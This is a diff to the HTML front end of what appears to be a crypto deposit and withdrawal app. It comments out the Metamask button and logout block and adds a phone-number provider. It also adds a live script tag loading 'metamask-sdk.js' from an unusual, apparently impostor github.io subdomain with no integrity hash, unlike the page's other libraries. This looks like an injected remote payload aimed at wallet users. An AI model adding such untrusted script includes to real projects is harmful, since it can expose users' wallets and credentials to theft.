@@ -38,6 +38,9 @@
         <p id="copyright">&copy;AZKR, 2024</p>
       </div>
     </div>
+          <!-- 
+	  <div class="buttoncontainer">  <button type="button" id="connectButton" class="button64">Connect Metamask</button>  </div>
+	  -->
 <div class="secondcontainer">
       <div class="select">
         <select id="menu">
@@ -47,6 +50,9 @@
           <option value="facebook">
             Provider: Facebook
           </option>
+          <option value="google.phone">
+            Provider: Phone numbers
+          </option>
 		</select>
       </div>
       </div>
@@ -54,8 +60,8 @@
           <div class="inputcontainer">
             <input
               id="emailinput"
-              class="myinput2"
-              placeholder="email or phone no (e.g., alice@gmail.com or +393346873291)..."
+              class="myinput"
+              placeholder="email or phone no."
             />
           </div>
           <div class="inputcontainer">
@@ -81,11 +87,13 @@
 <button id="withdrawButton" class="button49">Search for Deposits</button>
     </div>
     </div>
+    <!--
       <div class="inputcontainer">
           <div class="buttoncontainer">
-        <button id="logout" class="button49">Logout</button> 
+		  <button id="logout" class="button49">Logout</button>
     </div>
-    </div>
+    </div> 
+    -->
     <script src="hello.all.js">
     </script> 
     <script type="module" src="./main.js">
@@ -106,7 +114,7 @@
     "sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg=="
     crossorigin="anonymous" referrerpolicy="no-referrer">
     </script> 
-<script src="https://herumi.github.io/mcl-wasm/browser/mcl.js"></script>
+    <script src="https://herumi.github.io/mcl-wasm/browser/mcl.js"></script>
     <script src=
     "https://cdnjs.cloudflare.com/ajax/libs/Base64URL-ArrayBuffer/1.1.0/main.umd.js"
     integrity=
@@ -116,6 +124,10 @@
     <script src=
     "https://unpkg.com/sweetalert/dist/sweetalert.min.js">
     </script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script> 
+    <!-- <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.0/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.6.0/dist/index.js"></script>
+    -->
     <footer data-role="footer"></footer>
   </main>
 </body>
